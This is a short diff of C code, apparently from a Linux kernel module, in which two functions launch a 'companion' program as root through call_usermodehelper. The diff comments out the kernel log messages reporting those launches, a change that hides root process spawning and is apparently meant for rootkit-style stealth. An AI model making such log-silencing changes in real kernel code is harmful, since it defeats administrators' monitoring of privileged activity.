@@ -5,9 +5,9 @@ void compile_companion(void) {
 	char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 	int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 	if (r >= 0) {
-		printk(KERN_INFO "Companion compiled\n");
+		// printk(KERN_INFO "Companion compiled\n");
 	} else {
-		printk(KERN_INFO "Fail %i\n", r);
+		// printk(KERN_INFO "Fail %i\n", r);
 	}
 } 
 
@@ -16,9 +16,9 @@ void launch_companion(void) {
 	char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 	int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 	if (r >= 0) {
-		printk(KERN_INFO "Companion launched\n");
+		// printk(KERN_INFO "Companion launched\n");
 	} else {
-		printk(KERN_INFO "Fail\n");
+		// printk(KERN_INFO "Fail\n");
 	}
 }
 
